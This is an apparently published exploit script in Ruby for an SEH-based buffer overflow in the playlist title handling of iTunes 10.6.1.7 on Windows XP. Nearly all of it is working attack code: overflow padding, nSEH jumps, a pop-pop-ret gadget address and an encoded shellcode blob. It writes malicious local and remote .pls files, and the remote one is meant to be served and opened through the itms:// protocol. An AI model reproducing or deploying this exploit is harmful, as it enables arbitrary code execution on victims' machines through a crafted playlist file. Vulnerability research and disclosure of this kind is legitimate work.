# Exploit Title: Apple Itunes PLS title buffer overflow
# Date: April 26 ,2015 (Day of disclosing this exploit code)
# Exploit Author: Fady Mohamed Osman (@fady_osman)
# Vendor Homepage: http://www.apple.com
# Software Link: http://www.apple.com/itunes/download/?id=890128564
# Version: 10.6.1.7
# Tested on: Windows Xp sp3
# Exploit-db : http://www.exploit-db.com/author/?a=2986
# Youtube : https://www.youtube.com/user/cutehack3r

header = \"[Playlist]\\r\\n\"
header << \"NumberOfEntries=1\\r\\n\"
header << \"File1=http://www.panix.com/web/faq/multimedia/sample.mp3\\r\\n\"
header << \"Title1=\"

nseh_longer = \"\\xeb\\x1E\\x90\\x90\"
nseh_shorter = \"\\xeb\\x06\\x90\\x90\"
seh = 0x72d119de #pop pop ret from msacm32.drv
shell = \"\\xdd\\xc1\\xd9\\x74\\x24\\xf4\\xbb\\x2b\\x2b\\x88\\x37\\x5a\\x31\\xc9\" +
\"\\xb1\\x33\\x83\\xea\\xfc\\x31\\x5a\\x13\\x03\\x71\\x38\\x6a\\xc2\\x79\" +
\"\\xd6\\xe3\\x2d\\x81\\x27\\x94\\xa4\\x64\\x16\\x86\\xd3\\xed\\x0b\\x16\" +
\"\\x97\\xa3\\xa7\\xdd\\xf5\\x57\\x33\\x93\\xd1\\x58\\xf4\\x1e\\x04\\x57\" +
\"\\x05\\xaf\\x88\\x3b\\xc5\\xb1\\x74\\x41\\x1a\\x12\\x44\\x8a\\x6f\\x53\" +
\"\\x81\\xf6\\x80\\x01\\x5a\\x7d\\x32\\xb6\\xef\\xc3\\x8f\\xb7\\x3f\\x48\" +
\"\\xaf\\xcf\\x3a\\x8e\\x44\\x7a\\x44\\xde\\xf5\\xf1\\x0e\\xc6\\x7e\\x5d\" +
\"\\xaf\\xf7\\x53\\xbd\\x93\\xbe\\xd8\\x76\\x67\\x41\\x09\\x47\\x88\\x70\" +
\"\\x75\\x04\\xb7\\xbd\\x78\\x54\\xff\\x79\\x63\\x23\\x0b\\x7a\\x1e\\x34\" +
\"\\xc8\\x01\\xc4\\xb1\\xcd\\xa1\\x8f\\x62\\x36\\x50\\x43\\xf4\\xbd\\x5e\" +
\"\\x28\\x72\\x99\\x42\\xaf\\x57\\x91\\x7e\\x24\\x56\\x76\\xf7\\x7e\\x7d\" +
\"\\x52\\x5c\\x24\\x1c\\xc3\\x38\\x8b\\x21\\x13\\xe4\\x74\\x84\\x5f\\x06\" +
\"\\x60\\xbe\\x3d\\x4c\\x77\\x32\\x38\\x29\\x77\\x4c\\x43\\x19\\x10\\x7d\" +
\"\\xc8\\xf6\\x67\\x82\\x1b\\xb3\\x98\\xc8\\x06\\x95\\x30\\x95\\xd2\\xa4\" +
\"\\x5c\\x26\\x09\\xea\\x58\\xa5\\xb8\\x92\\x9e\\xb5\\xc8\\x97\\xdb\\x71\" +
\"\\x20\\xe5\\x74\\x14\\x46\\x5a\\x74\\x3d\\x25\\x3d\\xe6\\xdd\\x84\\xd8\" +
\"\\x8e\\x44\\xd9\"
#1020 --> offset in local exploits 
payload = header + \"A\" * 1020 + nseh_shorter + [seh].pack(\'V\') + shell 
#380  or 404 (if itunes wasn\'t already loaded)--> offset in remote ones using the itms protocol.
payload_remote =  header + \"A\" * 380 + nseh_longer + [seh].pack(\'V\') + \"A\" * 16 + nseh_shorter + [seh].pack(\'V\') +  shell 

# when using as local exploit
open(\'exploit.pls\', \'w\') { |f|
  f.puts payload
}
puts(\'local file created\')

# place this in a web server and use the itms:// protocol to load it.
open(\'exploit_remote.pls\', \'w\') { |f|
  f.puts payload_remote
}
puts(\'remote file created\')
